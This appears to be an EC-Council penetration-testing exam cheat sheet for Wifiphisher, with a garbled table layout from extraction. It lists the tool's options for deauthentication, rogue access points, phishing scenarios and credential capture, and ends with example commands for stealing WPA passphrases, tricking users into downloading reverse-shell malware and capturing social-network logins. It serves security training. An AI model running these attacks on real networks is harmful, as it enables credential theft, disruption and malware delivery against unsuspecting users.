@@ -1,0 +1,144 @@
+Certified Penetration Testing Professional Exam 412-80
+Wifiphisher Cheat Sheet
+Certified Penetration Testing Professional
+Wifiphisher Cheat Sheet
+Wifiphisher
+Source: https://wifiphisher.org
+Wifiphisher is a tool that can automate the phishing attacks against Wi-Fi networks. It can be
+used to obtain WPA/WPA2 secret passphrases without performing brute force.
+Syntax
+wifiphisher [Options]
+Options
+h, --help Displays help message and exit
+-s SKIP, --skip SKIP Skip deauthing this MAC address
+-jI JAMMINGINTERFACE, --
+Manually choose an interface that supports monitor
+jamminginterface
+mode for deauthenticating
+JAMMINGINTERFACE
+-aI APINTERFACE, -- Manually choose an interface that supports AP mode
+apinterface APINTERFACE for spawning an AP
+-t TIMEINTERVAL, -- Choose the time interval between DEAUTH packets
+timeinterval TIMEINTERVAL being sent
+Choose the number of packets to send in each deauth
+-dP DEAUTHPACKETS, --
+burst. Default value is 1; 1 packet to the client and 1
+deauthpackets
+packet to the AP. Send 2 deauth packets to the client
+DEAUTHPACKETS
+and 2 deauth packets to the AP: -p 2
+Skip the deauthentication packets to the broadcast
+-d, --directedonly address of the access points and only send them to
+client/AP pairs
+Page | 1 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+Wifiphisher Cheat Sheet
+Skip the deauthentication phase. When this option is
+-nJ, --nojamming
+used, it requires only one wireless interface
+Manually choose an interface that supports both AP
+-i INTERFACE, --interface and monitor modes for spawning the rogue AP as well
+INTERFACE as mounting additional Wi-Fi attacks from Extensions
+(i.e. deauth)
+-eI EXTENSIONSINTERFACE, -
+Manually choose an interface that supports monitor
+-extensioninterface
+mode for running the extensions
+EXTENSIONINTERFACE
+-aI APINTERFACE, -- Manually choose an interface that supports AP mode
+apinterface APINTERFACE for spawning an AP
+-kN, --keepnetworkmanager Do not kill Network Manager
+-nE, --noextensions Do not load any extensions
+Enter the ESSID of the rogue Access Point
+-e ESSID, --essid ESSID
+Skips Access Point selection phase
+-pPD
+PHISHING_PAGES_DIRECTORY, Search for phishing pages in this location
+--phishing-pages-directory
+-p PHISHINGSCENARIO, --
+Choose the phishing scenario to run
+phishingscenario
+Skips the scenario selection phase
+PHISHINGSCENARIO
+-pK PRESHAREDKEY, --
+Add WPA/WPA2 protection on the rogue Access Point
+presharedkey PRESHAREDKEY
+Stop the script after successfully retrieving one pair of
+-qS, --quitonsuccess
+credentials
+Capture the BSSIDs of the APs that are discovered
+-lC, --lure10-capture
+during AP selection phase
+-lE LURE10_EXPLOIT, -- Fool the Windows Location Service of nearby Windows
+lure10-exploit users to believe it is within an area that was previously
+LURE10_EXPLOIT
+captured with --lure10-capture
+-iAM, --mac-ap-interface Specify the MAC address of the AP interface
+-iEM, --mac-extensions-
+Specify the MAC address of the extensions interface
+interface
+-iNM, --no-mac-
+Do not change any MAC address
+randomization
+The capture of the WPA/WPA2 handshakes for
+-hC, --handshake-capture
+verifying passphrase
+-dE ESSID, -deauth-essid
+Deauth all the BSSIDs in the WLAN with that ESSID
+ESSID
+-dC CHANNELS, --deauth-
+Channels to deauth
+channels CHANNELS
+Page | 2 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+Wifiphisher Cheat Sheet
+Enable logging. The output will be saved to
+--logging
+wifiphisher.log file
+-lP LOGPATH, --logpath
+Determine the full path of the log file
+LOGPATH
+-cM, --channel-monitor Monitor if the target access point changes the channel
+-cP CREDENTIAL_LOG_PATH, -
+Determine the full path of the file that will store any
+-credential-log-path
+captured credentials
+CREDENTIAL_LOG_PATH
+Monitor if the button on a WPS-PBC Registrar side is
+-wP, --wps-pbc
+pressed
+-wAI, --wpspbc-assoc- The WLAN interface used for associating to the WPS
+interface Access Point
+Perform the known beacons Wi-Fi automatic
+-kB, --known-beacons
+association technique
+-fH, --force-hostapd Force the usage of hostapd installed in the system
+-dnsmasq-conf DNSMASQ_CONF Determine the full path of dnmasq.conf file
+-dK, --disable-karma Disables KARMA attack
+-pE, --phishing-essid Determines the ESSID to be used for the phishing page
+Wifiphisher Commands
+Command Description
+Used for selecting the wireless adapters
+wifiphisher -aI wlan0 -jI wlan4
+manually. Here, the "Firmware Upgrade"
+-p firmware-upgrade --handshake-
+scenario is an easy way for obtaining the PSK
+capture handshake.pcap
+from a password-protected network
+Used against the target network with disclosed
+PSKs (e.g. Conference). Here, the "Plugin
+wifiphisher --essid
+Update" scenario is used to intrigue the
+CONFERENCE_WIFI -p plugin_update
+victims in downloading malicious executables
+-pK s3cr3tp4ssw0rd
+(e.g. malware containing a reverse shell
+payload)
+Used against victims in public areas. Here, the
+wifiphisher --essid "FREE WI-FI" "OAuth Login" scenario provides a simple way
+-p oauth-login -kB for capturing credentials from social networks,
+like Facebook
+Page | 3 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
